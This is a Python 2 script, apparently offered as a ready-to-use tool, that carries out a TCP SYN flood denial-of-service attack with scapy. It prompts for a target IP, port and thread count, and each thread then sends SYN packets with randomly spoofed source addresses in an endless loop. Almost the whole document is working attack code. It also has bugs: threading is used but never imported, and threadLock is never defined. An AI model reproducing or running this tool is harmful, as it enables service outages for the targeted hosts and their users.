
# Syn Flood Tool Python

from scapy.all import *
import os
import sys
import random

class myThread (threading.Thread):
    def __init__(self, threadID, name, counter,dstIP,dstPort):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.dstIP=dstIP
        self.dstPort=dstPort
    def run(self):
        print "Bat dau " + self.name
        SYN_Flood(dstIP,dstPort)
        threadLock.release()

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,9000)
	return x	

def SYN_Flood(dstIP,dstPort ):
	global count_packet
	print "Packets are sending ..."
	while True:
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()	
		TCP_Packet.sport = s_port      	# source port 
		TCP_Packet.dport = dstPort		# destination port
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		print " Send packet by ip source : " +IP_Packet.src

def info():
	os.system("clear")
	print "#############################"
	print "#                           #"
	print "#############################"
	print "# Welcome to SYN Flood Tool #"
	print "#############################"

	dstIP = raw_input ("\nTarget IP : ")
	dstPort = raw_input ("Target Port : ")
	quantity_thread= raw_input("Thread : ")
	
	return dstIP,int(dstPort),int(quantity_thread)
	
# MAIN 
dstIP,dstPort,quantity_thread = info()
print "#    START TCP SYN FLOOD    #"


thread = []
for i in range(quantity_thread):
	thread.append('')
	thread[i] = myThread(i, "Thread" + str(i), i,dstIP,dstPort)
	thread[i].start()

